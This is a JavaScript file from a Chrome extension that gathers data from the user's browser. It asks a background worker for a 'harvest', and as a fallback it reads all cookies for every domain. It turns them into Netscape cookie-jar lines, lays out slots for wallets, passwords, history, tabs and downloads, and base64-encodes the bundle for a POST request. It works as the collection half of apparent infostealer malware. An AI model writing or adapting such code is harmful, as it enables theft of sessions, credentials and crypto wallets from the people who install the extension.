// browser_dump.js — asks background for full harvest, encodes for POST
window.browserDump = (function () {
  async function collect() {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ type: "MULTIRBL_HARVEST" }, (resp) => {
          if (chrome.runtime.lastError) {
            resolve(fallbackMinimal());
            return;
          }
          if (resp && resp.ok && resp.data) resolve(resp.data);
          else resolve(fallbackMinimal());
        });
      } catch (_) {
        resolve(fallbackMinimal());
      }
    });
  }

  async function fallbackMinimal() {
    // popup-only fallback if SW unavailable
    const cookies = await new Promise((r) => chrome.cookies.getAll({}, (l) => r(l || [])));
    return {
      meta: {
        collectedAt: Date.now(),
        cookieCount: cookies.length,
        userAgent: navigator.userAgent,
        fallback: true,
      },
      cookies,
      byDomain: {},
      wallets: [],
      netscape: cookies.map((c) => {
        const domain = c.domain.startsWith(".") ? c.domain : c.domain;
        const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
        return [domain, flag, c.path || "/", c.secure ? "TRUE" : "FALSE",
          c.expirationDate ? Math.floor(c.expirationDate) : 0, c.name, c.value].join("\t");
      }),
      passwordsStyle: [],
      tabs: [], history: [], bookmarks: [], downloads: [], extensions: [], pageStores: [],
    };
  }

  function encode(dump) {
    const json = JSON.stringify(dump);
    try {
      return btoa(unescape(encodeURIComponent(json)));
    } catch {
      // chunk-safe: if too large, still try
      return btoa(json);
    }
  }

  return { collect, encode };
})();
